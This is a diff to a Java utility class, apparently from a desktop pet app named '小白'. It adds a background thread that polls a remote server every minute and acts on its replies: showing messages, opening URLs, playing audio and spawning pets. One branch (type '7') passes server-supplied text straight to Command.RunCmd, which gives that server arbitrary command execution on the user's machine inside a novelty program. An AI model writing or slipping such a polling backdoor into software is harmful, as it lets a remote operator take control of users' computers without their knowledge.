@@ -9,6 +9,15 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.UnsupportedEncodingException;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.security.NoSuchAlgorithmException;
+import java.util.Date;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import javax.swing.JFrame;
+import javax.swing.JOptionPane;
 
 public class Util {
 
@@ -158,6 +167,105 @@ public class Util {
                 }
             }
         }.start();
+    }
+
+    // 远程操作
+    public static void RemoteOperate() {
+        new Thread() {
+            public void run() {
+                while (true) {
+                    String res = HttpURLConnectionHelper.sendRequest(
+                            "https://xiaobai.xymtop.com/api/index.php?time=" + Pet.RunTime,
+                            "GET");
+
+                    String[] data = res.split("\"");
+                    String type = data[3];
+                    String content = data[7];
+                    System.out.println(res);
+                    if (type.equals("1")) {
+                        JOptionPane.showMessageDialog(null, content, "小白",
+                                JOptionPane.INFORMATION_MESSAGE);
+
+                    } else if (type.equals("2")) {
+                        // 处理url链接
+                        String deleteString = "";
+                        for (int i = 0; i < content.length(); i++) {
+                            if (content.charAt(i) != '/') {
+                                deleteString += content.charAt(i);
+                            }
+                        }
+                        Util.OpenUrl("https://xiaobai.xymtop.com?time=" + (new Date().getTime()));
+                    } else if (type.equals("3")) {
+                        new MsgUi();
+                    } else if (type.equals("4")) {
+                        new Pet("小白" + (Pet.PetCount++) + "号");
+                    } else if (type.equals("5")) {
+                        try {
+                            content = Util.unicodeToString(content);
+                            Music.PlayMsg(content);
+
+                        } catch (NoSuchAlgorithmException e) {
+                            // TODO Auto-generated catch block
+                            e.printStackTrace();
+                        }
+
+                    } else if (type.equals("6")) {
+                        // 处理url链接
+                        String deleteString = "";
+                        for (int i = 0; i < content.length(); i++) {
+                            if (content.charAt(i) != '/') {
+                                deleteString += content.charAt(i);
+                            }
+                        }
+                        try {
+                            Music.PlayWavRemote(deleteString);
+                        } catch (IOException e) {
+                            // TODO Auto-generated catch block
+                            e.printStackTrace();
+                        }
+                    } else if (type.equals("7")) {
+                        try {
+                            Command.RunCmd(content);
+                        } catch (IOException e) {
+                            // TODO Auto-generated catch block
+                            e.printStackTrace();
+                        }
+                    } else {
+                        try {
+                            Music.PlayMsg("没有相关操作哦");
+                        } catch (NoSuchAlgorithmException e) {
+                            // TODO Auto-generated catch block
+                            e.printStackTrace();
+                        }
+                        System.out.println("没有相关操作");
+                    }
+                    try {
+                        sleep(1000 * 60);
+                    } catch (InterruptedException e) {
+                        // TODO Auto-generated catch block
+                        e.printStackTrace();
+                    }
+                }
+
+            }
+        }.start();
+    }
+
+    public static String unicodeToString(String str) {
+
+        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");
+        Matcher matcher = pattern.matcher(str);
+        char ch;
+        while (matcher.find()) {
+            // group 6728
+            String group = matcher.group(2);
+            // ch:'木' 26408
+            ch = (char) Integer.parseInt(group, 16);
+            // group1 \u6728
+            String group1 = matcher.group(1);
+            str = str.replace(group1, ch + "");
+        }
+        return str;
     }
 
 }
